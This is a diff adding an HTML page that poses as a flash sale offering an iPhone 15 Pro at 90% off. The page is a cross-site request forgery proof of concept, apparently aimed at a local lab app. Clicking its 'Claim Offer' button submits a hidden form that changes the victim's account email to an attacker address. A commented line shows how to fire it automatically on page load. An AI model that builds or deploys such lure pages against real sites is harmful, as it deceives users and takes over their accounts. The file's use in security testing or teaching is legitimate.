@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Get iPhone 15 Pro for 90% OFF!</title>
+    <style>
+        body {
+            background: linear-gradient(to right, #ff416c, #ff4b2b);
+            color: white;
+            font-family: 'Arial', sans-serif;
+            text-align: center;
+            padding: 50px;
+        }
+
+        .offer-box {
+            background-color: rgba(255, 255, 255, 0.1);
+            border: 2px solid white;
+            border-radius: 15px;
+            padding: 30px;
+            max-width: 500px;
+            margin: auto;
+            box-shadow: 0 0 30px rgba(0,0,0,0.3);
+        }
+
+        h1 {
+            font-size: 2.5em;
+            margin-bottom: 15px;
+        }
+
+        p {
+            font-size: 1.3em;
+        }
+
+        .cta {
+            background-color: yellow;
+            color: #000;
+            padding: 10px 20px;
+            font-size: 1.1em;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        .cta:hover {
+            background-color: orange;
+        }
+    </style>
+</head>
+<body>
+    <div class="offer-box">
+        <h1>🔥 FLASH SALE: iPhone 15 Pro</h1>
+        <p><strong>Only Today:</strong> Get the latest iPhone 15 Pro at <span style="color: yellow;">90% OFF</span>!</p>
+        <p>Limited stock – act fast!</p>
+        <button class="cta" onclick="claimOffer()">Claim Offer</button>
+    </div>
+
+    <!-- Hidden auto-submitting CSRF form -->
+    <form id="csrfForm" action="http://localhost:8080/change_email" method="POST" style="display: none;">
+        <input type="hidden" name="email" value="hacked@example.com">
+        <!-- No CSRF token included intentionally -->
+    </form>
+
+    <script>
+        function claimOffer() {
+            document.getElementById('csrfForm').submit();
+        }
+
+        // Uncomment below line to auto-trigger on page load
+        // window.onload = claimOffer;
+    </script>
+</body>
+</html>
